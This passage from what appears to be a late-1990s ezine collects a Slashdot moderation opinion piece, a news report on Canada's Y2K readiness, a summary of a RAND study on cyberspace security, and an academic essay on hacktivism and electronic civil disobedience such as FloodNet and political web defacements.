          expect them to be of the same mind when they are of every age and experience level in the book.  Why then
          try to moderate them?  Why are so many people congratulating Slashdot on cutting down on "the noise"?  
          Why is it judged "noise" at all?  I don't see it as noise...I may skim it instead of reading it, but I 
          can't tell you how many times a well-placed, off-topic post has made my day. I don't want to read only 
          the standard opinion on any topic and IMO that is the big pitfall with moderation.  I want ALL the sights
          and smells of the bazaar, Times Square, the big city...from garbage to haute cuisine...not merely the 
          blandness of a made-to-order, frozen-dinner, must-see-TV suburb. Why?  Because in my case, it is the 
          posters who have nailed my mistakes, cursed me a blue streak, and even made me cry from whom I have 
          learned the most.  They have forced me to re-evaluate my opinions and restate my thoughts.  They have
          taught me and by their hard words helped me to grow.  And, they have become friends.
          So what should Slashdot do instead?  A few ideas:
       1. Set the default to all-posts-viewed.  If I'm not logged in or am new, let me see Slashdot in all its 
          raging glory and then let me decide if I want to choose  moderation.
       2. I can't prove this might help with the "noise", but I think having a Threads area as opposed to posts
          being on the same page as the article might naturally eliminate some problems.  That way, people who 
          really felt inspired to say something would click on a link at the end of the article to a thread 
          discussing the issue at hand.  There wouldn't be the vanity of being "seen" so much, which leads to 
          First Posts! and the like.
       3. If you must moderate, have a time limit on moderation, random selection of moderators, and a constant
          turnover on who is moderating among your registered users.  This will eliminate some of the cronyism that
           has already occured due to the 400+ being selected by the original group.  
       4. Learn to love the flames.  Certainly don't worry about Katz flames-- we gave him total hell on HotWired. 
          It's a tradition. Flames are instructional, even if you don't like what they're teaching you.
       5. Many posters seem to flame when there are articles that they don't feel are hard-core Slashdot.  So how 
          about a separate page for those articles?  The front page would be all the "News for Nerds" and you could 
          have a link to something like "The Rest of the World" which would be the same setup but with different 
          articles (and a place for Katz).
       
       When it's all said and done, if Rob wants to morph Slashdot threads into a university-like moderated discussion, it's his call.  Either way, I'll still be reading Slashdot.  But to me, what makes Slashdot great is its many passionate voices, not a few well-written posts. 
       Who needs the surburbs?...Give me that funk!

 34.0  Canada rolls into the fiscal new millennium with a steady eye on its govt mainframes....
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Canada Rolls into Fiscal 2000
       by Matt Friedman 
       
       9:30 a.m.  1.Apr.99.PST
       MONTREAL -- Civil servants here were watching their computer monitors closely Thursday. 
       
       Canada's federal government began its fiscal year today, marking the first time such a year will include dates in the
       year 2000. If Ottawa is going to be bitten by the millennium bug, this is when the problems might start showing up. 
       
       The government says it's ready. 
       
       "April 1 is hardly a surprise for us," said Paul Walsh, a spokesman for the federal Department of Public Works and
       Government Services. 
       
       "We have been doing compliance testing for the beginning of the fiscal year and for all of the other key days leading up
       to and after January 1, 2000." 
       
       Those trouble dates include New Year's Day itself, the start of the new fiscal year, and 9 September 1999 (the ninth
       day of the ninth month of 1999). Ottawa has also tested for 7 April 1999 -- the 99th day of 1999 -- and for 29
       February and 1 March 2000. The first year of the 21st century is a leap year, while the first year of the 20th century
       was not. 
       
       In any case, Canada will survive. If Y2K problems do arise, they will surface in financial reporting and management
       systems. Department and program managers may not have correct budget information, or may not be able to allocate
       funds. Walsh says that won't happen. 
       
       "We have tested all government-wide, mission-critical systems," Walsh said. "We ran the systems on mainframes,
       simulating different dates. And we tested all of the key dates, so we know that 1 April or any other date isn't an issue.
       Any problems would already have shown up in testing." 
       
       Joe Boivin, president of the Ottawa-based Global Millennium Foundation, has been critical of the Canadian government's
       Y2K efforts. However, he says that, for the most part, Ottawa has its house in order. 
       "The truth is, that anyone can see if there's going to be a problem by advancing dates in a spreadsheet," Boivin said.
       "It's not a difficult testing issue, and Ottawa has been testing." 
       
       "The truth is that the government is one of the world leaders on this." 
       
       The federal body that has been auditing the compliance process agrees. Though it is cautiously optimistic, the Office
       of the Auditor General (OAG) warns that there could still be problems. 
       
       "No one would claim that everything is all right at this point," said Nancy Cheng, a principal with the OAG's Audit
       Operations Branch. "The government is hoping to have everything done by June. It has taken the issue seriously, and
       there has been tremendous progress, but there will be glitches. It's just not clear whether they'll be visible to the
       public." 
       
       However, for all the planning and testing, Boivin remains skeptical that the Canadian government has covered all the
       bases. Some things are just going to fall through the cracks, he said. 
       
       "The government report has high completion numbers, but they still haven't implemented compliance in a production
       environment," Boivin said. 
       
       "You may have 90 percent of the job done, but it's the last 10 percent, when you get into the real-time world versus
       hopeful thinking and careful planning, that will give you problems. Anyone who has ever worked in a production
       environment can tell you that." 
       
       The biggest problems could stem from what Cheng called "interface issues," when government departments interact
       with business partners or with the provincial governments, many which are far behind Ottawa in their compliance
       efforts. 
       
       "The government has a lot of partners in the public and private sectors, and a lot of them are at different stages of
       compliance," she said. "That makes it difficult to know for sure, how prepared we really are." 
       
       "If Canada has an Achilles' heel, it's that we have a lot of people doing things at various levels of government and in
       the private sector, but we don't have a national Y2K coordinator," Boivin says. "Even if Ottawa is in good shape, there
       are the provinces -- and the municipalities aren't even at the 50 percent mark in compliance implementation and
       testing." 
       
       The Treasury Board of Canada's monthly Y2K progress report will be available on the board's Web site. The auditor
       general plans a third audit of federal Y2K readiness in June. This time, however, Cheng says that her department will
       have a special focus on federal contingency plans.

 SP.00 Intro article
       ~~~~~~~~~~~~~
       
       That Wild, Wild Cyberspace Frontier
       
       Cyberspace, like the old West, is a lawless domain of limitless possibilities--for good but also for evil. As in a frontier town, everyone with links to the
       Internet is going to have to see to their own protection, at least until law and order catch up. 
       
       A Russian hacker in St. Petersburg breaks into a Citibank computer system in New York and steals more than $10 million by electronically transferring the money to
       other banks around the world. Improbable? Not at all--the only remarkable aspect of the affair is that the hacker was caught and the case became public when
       Citibank requested his extradition. Banks try to keep such thefts under wraps because of the bad publicity, but security experts estimate that about 36 instances of
       computer intruders stealing sums of more than $1 million occur each year in Europe and the United States. 
       
       And that is just the tip of an iceberg of real and potential, civil and military, deliberate and accidental threats to the global web of interlinked computers and
       communications systems. In the headlong rush to "connect," little attention is being paid to gaping holes in the security of these information networks, according to
       RAND researchers Richard O. Hundley and Robert H. Anderson. "This is everybody's problem, and therefore nobody's problem; it falls through all the cracks,"
       they write in Security in Cyberspace: An Emerging Challenge for Society. 
       
       The authors provide a tour of the cyberspace frontier and of the "bad guys" and dangers lurking there. They also sketch a plan to bring a modicum of order and
       security to this chaotic, rapidly expanding, and essentially lawless territory. 
       
       From Printed Page to Cyberspace
       
       More and more informational activities are going digital and electronic, they point out, with these versions often supplanting all paper records. This is true of
       educational activities, the holdings of libraries, the process and results of research, engineering designs and industrial processes, the various mass information and
       entertainment media (newspapers, television, movies, etc.), and all manner of private and public records. 
       
       Also moving from the printed page into cyberspace are transactional activities, involving myriad commercial business and financial transactions, the operations of
       governments at all levels, political activities, and both public and private social interactions. 
       
       Activities involving the operation and control of essential physical and functional infrastructures--power grids, air traffic control systems, telecommunications and
       the like--are increasingly shifting from mechanical/electrical control to electronic/software control. 
       
       And the connectivity between information systems that is at the heart of cyberspace is spreading worldwide and becoming more and more universal, with millions of
       new entry points every year. 
       
       These loosely protected information networks can be attacked in a variety of ways, for a variety of purposes, the authors note: to insert false data, to steal, change or
       destroy data and programs, and to disrupt, manipulate or control a system's performance. Many of these types of attack have already occurred. Two notable
       examples are the "Internet Worm," which disrupted activities on the Internet in 1988, and the "Hannover Hacker," who stole information from computer files all over
       the world during 1986-1988 and sold it to the KGB. 
       
       All of these hostile actions can be done surreptitiously and many can be done remotely, at a great distance from the target, via a series of interlinked computers. 
       
       Malevolent acts are not the only worry; information systems operating in cyberspace can also be brought down unintentionally. Instances of this range from a farmer
       accidentally cutting a fiber-optic cable while burying a dead cow (which closed four major air-traffic control centers for over five hours in May 1991) to the software
       error that caused a major breakdown in AT&T long distance service in 1992. 
       
       Who Are the Potential Villains?
       
       The explosive expansion of cyberspace activities gives rise to a new set of vulnerabilities--for governments, the military, businesses, individuals and society as a
       whole--that can be exploited by a wide spectrum of "bad guys" for a variety of motives, Hundley and Anderson contend. These include hackers, disgruntled
       employees, criminals, terrorists, commercial organizations, and nations. The case of hacker Kevin Mitnick provides some insight into the first type. He led authorities
       on a high-speed chase through cyberspace after lifting 20,000 credit card numbers from various computer systems. Mitnick did not try to cash in on the ill-gotten
       bonanza, apparently more interested in thrills than profits, and was caught only after deliberately provoking the attention of a top computer security expert. Mitnick
       hacked into the files of Tsutomu Shimomura, who then tracked him down for authorities. 
       
       The resources required to cause harm in this cyberspace world are relatively small: one (or at most a few) computer experts with computer terminals hooked into the
       worldwide network can do considerable damage. The resources required for a nation or group to do significant damage to the military, economy, or society of
       another nation are larger, but far fewer than those required to acquire and use major weapon systems. The preparations can also be well hidden, if done carefully. As
       more and more people become "computer smart" and as villains of many different stripes become more and more aware of the opportunities for mayhem in
       cyberspace, the resources for major attacks could be within the reach of many nations and some malevolent groups. 
       
       To further complicate matters, cyberspace attacks mounted by these different actors are indistinguishable from each other, as are attacks mounted by domestic and
       foreign-based perpetrators, insofar as the perceptions of the victims are concerned. The distinction between "crime" and "warfare," "accident" and "attack," becomes
       blurred as does the distinction between police and military responsibilities. 
       
       In the authors' view, the danger of more (and more serious) threats in cyberspace is multiplying alarmingly. Statistics support their concern. The number of reported
       (many incidents go unreported) Internet penetrations rose from six in 1988 to 1,172 in the first six months of 1994. So far, at least, no major disasters have
       occurred, but the potential certainly exists. For example, it might be possible in the future for some perpetrators (nations or major terrorist groups) to inflict
       substantial damage by bringing down key parts of the nation's air traffic control system, or the electric power grid, or the international monetary transfer system, even
       if for a limited time. 
       
       Nor is a military disaster out of the question. If an enemy cyberspace attack disrupted a vital military logistics system, or the telecommunications network on which it
       depends, for a critical period during a campaign, the campaign could be jeopardized. 
       
       But taming this wild frontier won't be easy. In addition to the chaotic growth of cyberspace and the blurring of lines of local, national and international authority over
       activities conducted there, the authors identify another problem. Many individual users neither understand nor accept the need for communal responsibility in
       safeguarding cyberspace. 
       
       In suggesting the elements of a strategy for cyberspace security, Hundley and Anderson draw on a familiar metaphor. Like frontier towns, let each local enclave
       (business, university, research organization, government agency) see to its own protection, at least for the present, relying on available computer security software
       and firewalls (security strategies that control electronic access by outsiders but allow insiders, who presumably are trustworthy, to travel the information highways
       and byways with comparative freedom). But these are little more than stopgap measures, the authors conclude. Barring a technological breakthrough that is not now
       on the horizon, effective control of cyberspace will require a combination of laws, regulations, the education and training of users, and the cooperation of countries
       worldwide.

      Introduction 
   
      In the next century, when cyber-historians look back to the 1990s, they will recognize 1995 as the year of the graphical browser, the
      year the Internet began to be overshadowed by the Web. But they will probably also view 1998 as an important moment -- in the history
      of the browser wars. At a minimum, 1998 will be noted for the emergence of two terms that represent similar phenomena: electronic
      civil disobedience and hacktivism. In that year, a Net based affinity group called the Electronic Disturbance Theater pushed and
      agitated for new experimentation with electronic civil disobedience actions aimed mostly at the Mexican government. It engaged its
      FloodNet software and invited participation to an international set of artists, digerati, and political activists to make a "symbolic gesture" in
      support of Mexico's Zapatistas. While at the same time, in Britain, in Australia, in India, in China, on almost every continent there were
      reports of hacktivity. In the spring of 1998, a young British hacker known as "JF" accessed about 300 web sites and placed anti-nuclear
      text and imagery. He entered, changed and added HTML code. At that point it was the biggest political hack of its kind. Since then, and
      increasingly over the course of the year, there were numerous reports of web sites being accessed and altered with political content. 

      Taken together we may consider both the more symbolic electronic civil disobedience actions and the more tangible hacktivist events
      under the rubric of extraparliamentarian direct action Net politics, where extraparliamentarian is taken to mean politics other than
      electoral or party politics, primarily the grassroots politics of social movement. By no means was 1998 the first year of the browser wars,
      but it was the year when electronic civil disobedience and hacktivism came to the fore, evidenced by a front page New York Times
      article on the subject by the end of October. Since then the subject has continued to move through the media sphere. 1 

      What this paper attempts to do is examine these emerging trends from a slightly wider angled lens. This paper puts forth five portals for
      consideration: computerized activism, grassroots infowar, electronic civil disobedience, politicized hacking, and resistance to
      future war. At first they were conceived as five portals into Hacktivism, but perhaps they better serve as five portals for looking at the
      wider world of extraparliamentarian direct action Net politics, although that phrase is admittedly awkward. Nevertheless, these five
      portals seem to provide a useful starting point for a more in-depth, yet to come, examination of the convergence of activism, art, and
      computer-based communication and media. In addition to starting to define, to frame, and to contextualize contemporary hacktivity, in
      terms of its roots, its lateral dimension, and its trajectivity, this paper also asks some nascent questions of a political, tactical,
      technological, ethical, and legal nature and makes some preliminary claims about the likely direction of these various movements. 

      Computerized Activism 

      Computerized activism exists at the intersections of politico-social movements and computer-mediated communication. The origins of
      computerized activism extend back in pre-Web history to the mid 1980s. As an example, the first version of PeaceNet appeared in early
      1986. PeaceNet enabled - really for the first time - political activists to communicate with one another across international borders with
      relative ease and speed. 2 The advent of newsgroup services like PeaceNet, and wider dispersal of other Bulletin Board Systems, email
      lists, and gopher sites characterizes the cyber-environment within which most early on-line political activists found themselves. This largely
      text-based environment persisted up until as late as 1994 and 1995, when the first GUI browsers were introduced. Even today, while
      Web sites augment these earlier forms, email communication remains a central device in the international circulation of struggle and the
      creation and maintenance of international solidarity networks.3 

      During the early to mid 1980s the subject of computer-mediated communication (CMC) was taken up by scholars in, for example,
      psychology and sociology. When communication scholars began to examine CMC, and in particular when they began to assess the
      juncture of political communication and CMC, a number of academic treatments of "electronic democracy" were written in which politics
      is positioned narrowly within the confines of electoral or parliamentarian politics. 4 Among the earliest treatments of CMC from among
      communication scholars who entertain extraparliamentarian or grassroots politics is by Downing in "Computers for Political Change." 5
      Not surprisingly, PeaceNet is one of his case studies. For purposes of tracing the origins of more current cross-border email exchange
      and its role in creating and maintaining international solidarity networks, Downing points to PeaceNet's establishment of international links
      in 1987. Among early adopters of these means of communication were people in the 1980s anti-nuclear and Central American solidarity
      movements. 

      By the late 1980s and the very beginning of the 1990s, the significance of cross-border, international, email communication began to be
      realized. The international role of email communication, coupled to varying degrees with the use of the Fax machine, was highlighted in
      both the struggles of pro-democracy Chinese students and in broader trans-national movements that lead to the dissolution of the Soviet
      Union. Shortly thereafter, we began to see scholarly work on this subject. Harasims "Global Networks: Computers and International
      Communication" began to theorize about the role of international email communication in linking together the world. 6 

      Computerized activism remained marginal to political and social movements until the explosion of the Internet in the early to mid 1990s
      and more so until the arrival of the graphical browser in 1994 and 1995. Now, in the post-Web Internet phase there is widespread use of
      these media forms by a plethora of grassroots groups and other political actors in countries all over the world. 7 

      A common thread or understanding that runs through various types of politically based computer-mediated communication, from early
      BBS systems, to email listservs, and to sophisticated Web sites with fancy bells and whistles, seems to be an overarching dominant
      paradigm that privileges discourse, dialogue, discussion and open and free access. This observation becomes important when looking
      more at electronic civil disobedience and politicized hacking, because it is with this dominant paradigm of the Habermasian Web that
      these later forms conflict and cause friction. 

      So the first portal of Computerized Activism is important for understanding the roots of todays extraparliamentarian, more direct action
      focused, political CMC. It is the portal that has been with us the longest, and the portal within which most political actors on the Net feel
      the most comfortable. Computerized activism, defined more purely as the use of the Internet infrastructure as a means for activists to
      communicate with one another, across international borders or not, is less threatening to power than the other types of uses we see
      emerging in which the Internet infrastructure is not only a means toward or a site for communication, but the Internet infrastructure itself
      becomes an object or site for action. This transgression, or paradigmatic shift in thinking, of moving away from believing the Internet
      solely as communication device to Internet as communication device and site for action is dealt with incrementally in the next four
      sections. 

      Grassroots Infowar 

      Grassroots infowar is an intensification of computerized activism. Infowar here refers to a war of words, a propaganda war. Grassroots
      infowar is the first step, the first move away from the Internet as just a site for communication and the beginning of the transformation
      from word to deed. Grassroots infowar actors emerge fully cognizant they are on a global stage, telepresent across borders, in many
      locations simultaneously. There exists a sense of immediacy and interconnectivity at a global level. More than a mere sharing of
      information and dialogue, there is a desire to push words towards action. Internet media forms become vehicles for inciting action as
      opposed to simply describing or reporting. 

      In the early 1990s, following the U.S. directed "smart" bombardment of Iraq and following the dissolution of the Soviet Union and the
      subsequent uselessness of Cold War rhetoric as a rationalization for foreign intervention, the U.S. military-intelligence community, along
      with its allies in financial-corporate sectors, needed to craft a new military doctrine. Their answer was Information Warfare and the threat
      of info-terrorism. State-side scholars at RAND, a think tank in Santa Monica, California, that often does the military's "thinking", set
      about devising new theoretical constructs that would lay the basis for their version of Information Warfare. In 1993, under the RAND
      banner, Ronfeldt and Arquilla wrote Cyberwar is Coming! This work sets out the distinctions between netwar and cyberwar and is
      cited by nearly every subsequent treatment of Information Warfare theory.8 Where netwar refers more to the war of words, the
      propaganda war that exists on the Internet itself, cyberwar refers to cybernetic warfare, war dependent on computers and
      communications systems, the war of C4I - Command, Control, Communication, Computers, and Information. 

      Not long after RAND's theoretical intervention, pragmatic cases of netwar appeared. Among the most celebrated is the case of Mexico's
      Zapatistas and the international community of supporters that quickly brought that struggle on to the Internet. With the global
      pro-Zapatista Internet experience there began to be a rethinking or an interrogation of RAND's theoretical constructs, albeit from a more
      radical grassroots perspective. Some of this recasting has been brought forth in pieces by Harry Cleaver, a professor at the University of
      Texas at Austin and key person behind the Chiapas95 project, an email-based news and information distribution service. Probably
      Cleaver's most well known work in this regard is "The Zapatistas and the Electronic Fabric of Struggle." 9 

      Despite some radical interventions and attempts to reframe dominant forms of military and intelligence Information Warfare theory, most
      of the material, not surprisingly, is produced by the likes of RAND, the National Defense University, the Department of Defense, the US
      Air Force, or private sector initiatives. The meme of Information Warfare seems to have spread and been promulgated largely through
      network security paranoics and others keen on guarding digital property. But there are signs that Information Warfare is spreading to
      other areas. This year Information Wafare hit the international digital arts community by being the main subject of the annual Ars
      Electronic Festival in Linz, Austria.9 

      Theorizing about grassroots or bottom-up Information Warfare doesn't nearly get as much attention as the dominant models and as a
      consequence there is not much written on the subject. 11 The case of the global pro-Zapatista networks of solidarity and resistance offers
      a point of departure for further examination of grassroots infowar. One feature of Zapatista experience over the course of the last 5 years
      is that it has been a war of words, as opposed to a prolonged military conflict. This is not to say there isn't a strong Mexican military
      presence in the state of Chiapas. Quite the contrary is true. But fighting technically ended on January 12, 1994 and since then there has
      been a ceasefire and numerous attempts at negotiation.12 What scholars, activists, and journalists, on both the left and the right, have said
      is that the Zapatistas owe their survival at this point largely to a war of words. This war of words, in part, is the propaganda war that has
      been successfully unleashed by Zapatista leaders like Subcommandante Marcos as well as non-Zapatista supporters throughout Mexico
      and the world. Such propaganda and rhetoric has, of course, been transmitted through more traditional mass communication means, like
      through the newspaper La Jornada. 13 But quite a substantial component of this war of words has taken place on the Internet. Since
      January 1, 1994 there has been an explosion of the Zapatista Internet presence in the forms of email Cc: lists, newsgroups, discussion
      lists, and web sites.14 

      A primary distinction, then, between earlier forms of computerized activism and forms of grassroots infowar is in the degree of intensity.
      Coupled with that is the degree to which the participants are noticed and seen as a force. Given the Zapatistas relatively high profile in
      Mexican society over the course of the last five years, and given the fact that they are technically a belligerent force negotiating with a
      government, the Internet activity surrounding them takes on a different significance than, say, for example, the Internet activity of the
      Sierra Club, Amnesty International, or other similar ventures. 

      An important difference is that in grassroots infowar comes the desire to incite action and the ability to do so at a global scale. At the end
      of 1997, news of the Acteal massacre in Chiapas, in which 45 indigenous people were killed, quickly spread through global
      pro-Zapatista Internet networks. Within a matter of days there were protests and actions at Mexican consulates and embassies all over
      the world.15 This incident, too, is now seen as a turning point in the stance by some toward the Internet infrastructure. While prior to this
      moment, there had been few if any incident reports of pro-Zapatista hacktivity, following there has been a shift, the beginning of the move
      toward accepting the Internet infrastructure as both a channel for communication and a site for action. 

      Electronic Civil Disobedience 

      Acting in the tradition of non-violent direct action and civil disobedience, proponents of Electronic Civil Disobedience are borrowing the
      tactics of trespass and blockade from these earlier social movements and are experimentally applying them to the Internet. A typical civil
      disobedience tactic has been for a group of people to physically blockade, with their bodies, the entranceways of an opponent's office or
      building or to physically occupy an opponent's office -- to have a sit-in. Electronic Civil Disobedience, as a form of mass decentered
      electronic direct action, utilizes virtual blockades and virtual sit-ins. Unlike the participant in a traditional civil disobedience action, an
      ECD actor can participate in virtual blockades and sit-ins from home, from work, from the university, or from other points of access to
      the Net. [16] 

      The phrase "Electronic Civil Disobedience" was coined by a group of artists and theorists called the Critical Art Ensemble. In 1994 they
      published their first book that dealt with this subject, "The Electronic Disturbance," followed two years later by "Electronic Civil
      Disobedience and Other Unpopular Ideas."16 Both of these works are devoted to a theoretical exploration of how to move protests from
      the streets onto the Internet. They examine the tactics of street protest, on-the-ground disruptions and disturbance of urban infrastructure
      and they hypothesize how such practices can be applied to the Internet infrastructure.17 

      Before 1998, Electronic Civil Disobedience remained largely as theoretical musings. But after the 1997 Acteal Massacre in Chiapas,
      there was a shift toward a more hybrid position that views the Internet infrastructure as both a means for communication and a site for
      direct action. This shift distinguishes more sharply the third portal of Electronic Civil Disobedience from the first and second portals. 

      Electronic Civil Disobedience is the first transgression, making Politicized Hacking the second transgression and Resistance to Future
      War the third. Each succeeding transgression moves the stance toward the Internet infrastructure further away from the public sphere
      model and casts it more as conflicted territory bordering on a war zone. Where the former more discursive model is perhaps a
      manifestation of Habermas's Paris Salon, the later may have roots in the Boston Tea Party. 18 

      The realization and legitimization of the Internet infrastructure as a site for word and deed opens up new possibilities for Net politics,
      especially for those already predisposed to extraparliamentarian and direct action social movement tactics. In early 1998 a small group
      calling themselves the Electronic Disturbance Theater had been watching other people experimenting with early forms of virtual sit-ins.
      The group then created software called FloodNet and on a number of occasions has invited mass participation in its virtual sit-ins against
      the Mexican government. 19 

      EDT members Carmin Karasic and Brett Stalbaum created FloodNet to direct a "symbolic gesture" against an opponent's web site.
      FloodNet is a Web-based Java applet that repeatedly sends browser reload commands.20 In theory, when enough EDT participants are
      simultaneously pointing the FloodNet URL toward an opponent site, a critical mass prevents further entry. Actually, this has been rarely
      attained. Given this, perhaps FloodNet's power lies more in the simulated threat. 

      On September 9, 1998, EDT exhibited its SWARM project21 at the Ars Electronic Festival on Information Warfare, where it launched a
      three-pronged FloodNet disturbance against web sites of the Mexican presidency, the Frankfurt Stock Exchange, and the Pentagon, to
      demonstrate international support for the Zapatistas, against the Mexican government, against the U.S. military, and against a symbol of
      international capital.22 

      But within several hours of activating project SWARM, FloodNet was disabled. On web browsers Java coffee cups streamed quickly
      across the bottom of the screen and FloodNet froze. Participants began to send email with word of trouble. Later that day a Wired
      writer learned from a Department of Defense spokesperson that the DOD had taken some steps against FloodNet. At the same time, an
      EDT co-founder received email that the Defense Information Systems Agency had complained about his ECD web site content.23 

      Globally, 20,000 connected to the FloodNet browser on September 9 and 10. This action reverberated through European media. It was
      later picked up by Wired, ZDTV, Defense News, and National Public Radio, among others. On October 31, EDT made the front page
      of the New York Times. The story continued to unfold. More interest from the media sphere. On November 22, EDT called for
      FloodNet against the School of the Americas.24 As part of EDT's grande finale for the 1998 season, the group plans to release a public
      version of FloodNet at 12:01 a.m. on January 1, 1999. 

      Politicized Hacking 

      Again mentioning Mexico, in addition to the Electronic Civil Disobedience style action directed at the surface, at the web site
      entranceway, there have also been in 1998 actually hacks into Mexican government web sites where political messages have been added
      to those sites. 25 This particular tactic of accessing and altering web sites seems to have been the popular tactic for this year. Probably
      one of the most well known examples of this is the story of the young British hacker named "JF" who hacked into around 300 web sites
      world wide and placed anti-nuclear imagery and text. This method has been tried by a number of groups. October issues of the Ottawa
      Citizen and the New York Times did a decent job of capturing a number of these examples as they described this new trend. 26 

      One main distinction between most Politicized Hacking and the type of Electronic Civil Disobedience just mentioned is that while ECD
      actors dont hide their names, operating freely and above board, most political hacks are done by people who wish to remain
      anonymous. It is also likely political hacks are done by individuals rather than by specific groups. 

      One of the reasons for the anonymity and secrecy is that the stakes are higher. Where proponents of forms of electronic civil
      disobedience actions are perhaps in an ambiguous area of law, certain types of political hacks, used to varying degrees of success, are
      unquestionably illegal. Few will question the legality of actually entering into an opponent's computer and adding or changing HTML
      code. 

      This distinction speaks to a different style of organization. Because of the more secret, private, low key, and anonymous nature of the
      politicized hacks, this type of activity expresses a different kind of politics. It is not the politics of mobilization, nor the politics that
      requires mass participation. This is said not to pass judgement, but to illuminate that there are several important forms of direct action Net
      politics already being shaped. 

      As touched on already, depending on the conception of politics, politicized hacking is either a recent phenomena or one that can be
      traced back to hacking's origins. For the purposes of creating a portal to look into this world of extraparliamentarian direct action Net
      politics, it may be useful to consider both perspectives. There is clearly something political about early hackers' desires to make
      information free. It probably would be useful to examine the history of early to mid 1980s hacking to look for more political origins of
      today's hacktivism. The computerized activism of the mid to late 1980s existed alongside the first generation of hackers. There may have
      been cross-over then. 

      The contemporary conception of hacktivism seems to concern itself more with overtly political hacking. It is such a recent development
      that journalists have only barely begun to discover it, while scholars have had little time to consider it. There are numerous web sites
      devoted to hacking, but very few are devoted to Hacktivism per se. Although, one web site devoted to Hacktivism was created in the fall
      of 1998 by a group called The Cult of the Dead Cow. 27 

      An important fact to realize and emphasize is that hacktivism, current forms of politicized hacking, is very much in its infancy. It is too
      early to draw definitive conclusions or to make strong predictions as to the direction it will take. Perhaps we can point to certain
      trajectories and make some logical projections. But we need to remember that at this point there is no consensus or agreement. Maybe
      the entire notion of hacktivism confuses and challenges sets of values and hacker codes of ethics. Quite possibly there is some re-thinking
      happening and we might begin to see a new set of ethical codes for hacking.28 

      Resistance to Future War 

      Some call the 1990-1991 Gulf War the first Information War because of the heavy military reliance on information and communication
      technology. The Gulf War was a pinnacle of achievement for the weapons industry, a chance to battle test sophisticated hardware that
      had been developed and manufactured under the Reagan and Bush presidencies. The weapons systems were dependent, as were all
      communications, on a major telecommunications infrastructure involving satellite, radar, radio, and telephone. The "smart" bombs were
      just the most mentioned of the sophisticated weaponry that was showcased during the made-for-CNN war. 

      Although significantly under-reported by mainstream U.S. media, there was sizeable domestic opposition to the Gulf War, both prior to
      and especially during the first days of U.S. bombing of Iraq. In San Francisco, the first three days of the Gulf War are referred to as the
      Three Days of Rage. During that period, demonstrators filled, occupied, and controlled the streets and in some cases bridges and
      highways in the greater San Francisco Bay Area. Similar disruptions happened up and down the west coast and all across the country.
      There was widespread grassroots resistance to the U.S. bombardment of Iraq in January 1991.29 

      One part of that history is the role of information and communication technology, not just for the military forces, but also for the
      grassroots resistance. If the Gulf War is indicative of a paradigmatic shift toward the practice of Information Warfare, then it's also useful
      to look at the way in which ICT enabled resistance to the war effort. Some people within the opposition to the 1990-1991 Gulf War
      used email to communicate and they learned about resistance in other cities through Bulletin Board Systems and newsgroups. Others
      without computer access used fax and telephone. But many people had no connection to computers and received nothing by fax, instead
      they came out into the streets because of seeing posters or by hearing announcements on TV or on radio, or through word of mouth. It is
      safe to say that the Internet played only a marginal role in spreading news and moving people into action. The opposition to the war also
      watched CNN just like everyone else.  

      But that was the end of 1990 and the very beginning of 1991, 8 years ago at the time of this writing, and in a pre-Web phase and even
      pre-Internet phase. Yes, by then the PC revolution had exploded and more and more people were buying modems, but the Gulf War is
      clearly positioned in the pre-boom days of the Internet in the United States. An interesting question is what would happen today, or
      moreover, what might happen tomorrow or in the near future, if presented with a similar set of circumstances. What if, for example, a
      Gulf War-like scenario emerged at the end of the year 2000 and the beginning of 2001? Suppose the United States decided to engage in
      what became an unpopular war, what might hacktivism look like in a condition of more generalized resistance? Or said another way,
      what might generalized resistance look like with the condition of hacktivism? 

      The above is what is meant to be asked by suggesting that Resistance to Future War is the fifth portal into direct action Net politics.
      Where might this all lead? Until now, incidents of hacktivity have been sporadic and basically unconnected. Hacktivist events have been
      singular and not connected to a set of simultaneous occurrences. Perhaps the Electronic Disturbance Theater's work demonstrates the
      possibility of waging a campaign on the Internet, and sustaining a presence over a period of time. But the group's one goal of a SWARM
      has yet to be achieved. Maybe it is useful to think of the SWARM metaphor in the consideration of Resistance to Future War. 

      Perhaps a SWARM is a convergence of generalized resistance, referring to a situation in which there are not just isolated cases, or
      several pockets of opposition, but when there is across-the-board resistance occurring at a number of different levels and happening in
      cities and towns all across the country, all at the same time. Such was the case during moments of domestic Gulf War resistance. There
      was a simultaneous outpouring of people into the streets who engaged in quite a range of activity, both legal and illegal. A multitude of
      tactics were being used at the same time but without any central command or directing orders from above. Incidents of such upsurge are
      rare, but they undoubtedly will occur again. What will hacktivism look like then? What of it when hacktivism moves from isolated
      incidents to a convergence of allied forces? Is this when hacktivism ceases to be and becomes cyberspacial resistance? While it may be
      too early to make accurate predictions, it seems true that the force or power of hacktivism has yet to be fully recognized or tested. Yet
      before getting lost in futuristic science fiction, consider some critiques. 

      Emerging Critiques of Direct Action Net Politics  

      There is no consensus among social and political activists regarding electronic civil disobedience, political hacking, hacktivism, or more
      generally extraparliamentarian direct action Net politics. It may in fact be too early to judge or to make definitive claims about these new
      tactics, but some critiques have co-developed along with the development of these new methods. They point to some basic questions
      over the effectiveness and appropriateness of these forms of electronic action. 

      In an emerging discourse on several email listservs, that is too complicated to treat fairly in such a short piece as this one, there have been
      periodic criticisms raised both generally and specifically about aspects of the above mentioned tactics.30 By no means can this piece
      attempt to describe and comment on all criticisms being raised about hacktivism et al, but it can at least address several of the criticism
      raised that seem most important. As already stated there are critiques aimed at the effectiveness and the appropriateness of
      cyber-protests. In terms of effectiveness, three closely related types of questions have appeared regarding political, tactical, and technical
      effectiveness. Concerning appropriateness there are ethical questions, that may be also considered as political questions, and of course
      there are legal questions. Some of the legal concerns raise issues of enforceability and prosecuteability.  

      Political and tactical effectiveness are closely intertwined. Are these methods of computerized activism effective? The answer to which is,
      that it depends on how effectiveness is defined. What is effective? If the desired goal of hacktivism is to draw attention to particular issues
      by engaging in actions that are unusual and will attract some degree of media coverage, then effectiveness can be seen as being high. If,
      however, effectiveness is measured in terms of assessing the actions ability to be a catalyst for fomenting a more profound mobilization of
      people, then probably these new techniques are not effective. This distinction then, perhaps, is important. Hacktivism is not likely to be an
      organizing tool and the end result of hacktivity is not likely to be an increase in the ranks of the disaffected. Rather hacktivism appears to
      be a means to augment or supplement existing organizing efforts, a way to make some noise and focus attention. 

      Technical critiques of hacktivism at the level of computer code are another way of addressing the efficacy of these new methods.
